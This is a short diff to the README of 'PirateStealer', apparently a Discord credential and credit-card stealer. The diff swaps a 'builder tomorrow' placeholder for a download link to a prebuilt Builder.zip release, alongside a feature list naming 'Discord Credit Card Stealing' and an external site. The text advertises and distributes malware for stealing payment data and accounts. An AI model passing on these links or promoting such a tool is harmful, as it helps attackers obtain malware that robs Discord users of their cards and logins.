@@ -7,7 +7,7 @@ Official PirateStealer repos
 # Other Websites
 - https://monster.casa
 
-# Builder Tomorow, else compile from src in Injector :)
+# [Builder](https://github.com/Stanley-GF/PirateStealer/releases/download/1.0.0/Builder.zip)
 
 # Features
 - Discord Credit Card Stealing
